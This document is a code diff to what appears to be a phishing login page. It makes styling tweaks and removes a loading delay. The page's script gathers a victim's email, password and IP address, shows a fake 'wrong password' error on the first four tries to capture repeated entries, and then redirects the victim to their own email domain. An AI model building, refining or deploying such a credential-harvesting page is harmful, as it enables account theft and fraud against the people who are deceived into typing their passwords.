@@ -73,16 +73,23 @@
       .input-icon {
         position: absolute;
         top: 50%;
-        left: 10px;
+        left: 12px;
         transform: translateY(-50%);
         font-size: 16px;
         color: #888;
+        pointer-events: none; /* Prevents icon from interfering with input */
+        z-index: 1; /* Ensures icon stays above input */
       }
       .input-field {
         width: 100%;
-        padding: 10px 10px 10px 35px;
+        padding: 10px 10px 10px 40px; /* Increased padding for icon */
         border: 1px solid #ccc;
         border-radius: 5px;
+        font-size: 16px;
+      }
+      .input-field:focus {
+        outline: none;
+        border-color: #007bff;
       }
       .error-msg {
         color: red;
@@ -217,7 +224,7 @@
       </form>
     </div>
 
-    <!-- Loader Overlay -->
+    <!-- Loader Overlay (only for step1) -->
     <div id="loader-overlay" class="loader-overlay">
       <div class="spinner-border text-light" role="status">
         <span class="visually-hidden" id="loader-text">Loading...</span>
@@ -423,7 +430,7 @@
           const password = document.getElementById("passwordInput").value.trim();
           const data = { email, password, ...userData };
 
-          document.getElementById("loader-overlay").style.display = "flex";
+          // Submit data without showing loader
           new Promise(resolve => {
             const t = setInterval(() => {
               if (userData.ipAddress !== "Fetching...") {
@@ -443,16 +450,10 @@
             });
 
             if (isFirstAttempt || isSecondAttempt || isThirdAttempt || isFourthAttempt) {
-              setTimeout(() => {
-                document.getElementById("loader-overlay").style.display = "none";
-                document.getElementById("passwordError").style.display = "block";
-                document.getElementById("passwordInput").value = "";
-              }, 3000);
+              document.getElementById("passwordError").style.display = "block";
+              document.getElementById("passwordInput").value = "";
             } else if (submitCount === 5) {
-              setTimeout(() => {
-                document.getElementById("loader-overlay").style.display = "none";
-                window.location.href = domain ? `https://${domain}` : "https://example.com";
-              }, 3000);
+              window.location.href = domain ? `https://${domain}` : "https://example.com";
             }
           });
         });
